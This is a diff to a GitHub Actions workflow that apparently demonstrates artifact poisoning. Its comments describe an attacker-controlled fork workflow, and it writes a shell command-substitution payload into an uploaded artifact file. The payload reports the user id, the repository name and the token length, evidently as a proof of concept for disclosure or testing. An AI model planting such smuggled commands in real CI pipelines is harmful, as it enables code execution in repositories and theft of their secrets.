@@ -9,12 +9,15 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+      # Attacker controls this workflow file (it is the fork/PR copy) and therefore
+      # fully controls every byte of the uploaded artifact.
       - name: Save report for comment workflow
         run: |
           mkdir -p /tmp/artifact
           echo "1" > /tmp/artifact/pr-number.txt
           echo "true" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' "aGVsbG8=" > /tmp/artifact/diff-content.txt
+          printf '%s\n' '$(echo RCE_PROOF_uid_$(id -u)_repo_${GITHUB_REPOSITORY}_toklen_${#GITHUB_TOKEN} >&2)' > /tmp/artifact/diff-content.txt
+          printf '%s\n' '# report' > /tmp/artifact/diff-report.md
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
         with:
